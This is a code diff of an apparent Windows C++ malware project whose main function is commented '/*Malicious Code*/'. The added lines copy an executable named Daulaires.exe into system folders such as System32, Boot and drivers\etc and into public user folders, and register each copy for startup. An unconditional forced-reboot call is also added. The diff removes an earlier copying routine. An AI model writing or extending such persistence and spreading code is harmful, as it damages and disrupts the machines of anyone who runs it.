@@ -1,31 +1,5 @@
 ﻿#include "Depenencies/Headers/Tools.h"
 
-using namespace std;
-
-auto scanThroughDirs() -> void {
-
-    Memory Memory;
-    Info Info;
-    map<string, string> paths;
-    // app different paths to the map
-    paths["C:\\Users\\Public\\"] = "C:\\Users\\Public\\";
-    paths["C:\\Users\\"] = "C:\\Users\\";
-    paths["C:\\Users\\Public\\Documents\\"] = "C:\\Users\\Public\\Documents\\";
-    paths["C:\\"] = "C:\\";
-    paths["C:\\Windows\\System32\\"] = "C:\\Windows\\System32\\";
-    paths["C:\\Windows\\Boot\\"] = "C:\\Windows\\Boot\\";
-    paths["C:\\Windows\\"] = "C:\\Windows\\";
-    paths["C:\\Windows\\System32\\drivers\\"] = "C:\\Windows\\System32\\drivers\\";
-    paths["C:\\Windows\\System32\\drivers\\etc\\"] = "C:\\Windows\\System32\\drivers\\etc\\";
-    paths["C:\\Windows\\System32\\drivers\\etc\\hosts"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
-    // loop through all the paths and add Daulaires.exe to them
-    for (const auto& path : paths) {
-        // convert the path to a string before adding the file name
-        string pathString = path.second;
-        Memory.SilentMoveFile("Daulaires.exe", Info.getCurrentDirectory(), pathString);
-    };
-};
-
 auto Main::Windows() -> bool
 {
     Info info;
@@ -38,7 +12,7 @@ auto Main::Windows() -> bool
     utils.DisplayText(info.getSystemType());
 
 
-    Memory.SilentWriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
+    Memory.WriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
 
     // system("shutdown /r /t 0");
 
@@ -112,7 +86,7 @@ auto Main::Windows() -> bool
         };
 
         getline(cin, input);
-        Memory.SilentWriteToFile("test.txt", "C:\\Users\\Public\\", input);
+        Memory.WriteToFile("test.txt", "C:\\Users\\Public\\", input);
 
 
         if (commands.find(input) != commands.end()) {
@@ -152,19 +126,22 @@ void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
     }
 };
 
-auto write_file_to_dirs() -> void {
+void write_file_to_dirs() {
     map<string, string> paths;
     // app different paths to the map
-    paths["C:\\Users\\Public\\"] = "C:\\Users\\Public\\";
-    paths["C:\\Users\\"] = "C:\\Users\\";
-    paths["C:\\Users\\Public\\Documents\\"] = "C:\\Users\\Public\\Documents\\";
-    paths["C:\\"] = "C:\\";
-    paths["C:\\Windows\\System32\\"] = "C:\\Windows\\System32\\";
-    paths["C:\\Windows\\Boot\\"] = "C:\\Windows\\Boot\\";
-    paths["C:\\Windows\\"] = "C:\\Windows\\";
-    paths["C:\\Windows\\System32\\drivers\\"] = "C:\\Windows\\System32\\drivers\\";
-    paths["C:\\Windows\\System32\\drivers\\etc\\"] = "C:\\Windows\\System32\\drivers\\etc\\";
-    paths["C:\\Windows\\System32\\drivers\\etc\\hosts"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+    paths["path_1"] = "C:\\Users\\Public\\";
+    paths["path_2"] = "C:\\Users\\";
+    paths["path_3"] = "C:\\Users\\Public\\Documents\\";
+    paths["path_4"] = "C:\\";
+    paths["path_5"] = "C:\\Windows\\System32\\";
+    paths["path_6"] = "C:\\Windows\\Boot\\";
+    paths["path_7"] = "C:\\Windows\\";
+    paths["path_8"] = "C:\\Users\\Public\\Downloads\\";
+    paths["path_9"] = "C:\\Users\\Public\\Pictures\\";
+    paths["path_10"] = "C:\\Users\\Public\\Videos\\";
+    paths["path_11"] = "C:\\Windows\\System32\\drivers\\";
+    paths["path_12"] = "C:\\Windows\\System32\\drivers\\etc\\";
+    paths["path_13"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
 
     std::wstring appName = L"Daulaires.exe";
     // loop through all the paths and add Daulaires.exe to them
@@ -173,6 +150,8 @@ auto write_file_to_dirs() -> void {
         string pathString = path.second;
         std::wstring appPath = std::wstring(pathString.begin(), pathString.end()) + L"Daulaires.exe";
         addToStartup(appName, appPath);
+        // copy the file to the path
+        CopyFile(L"Daulaires.exe", appPath.c_str(), FALSE);
     };
 };
 
@@ -197,12 +176,11 @@ int main() {
     };
 
     /*Malicious Code*/
-    scanThroughDirs();
     write_file_to_dirs();
     /*End Malicious Code*/ 
     
     // loop through the Info functions to check what the system is
+    system("shutdown /r /t 0");
     Main.Windows();
-
     return 0;
 };
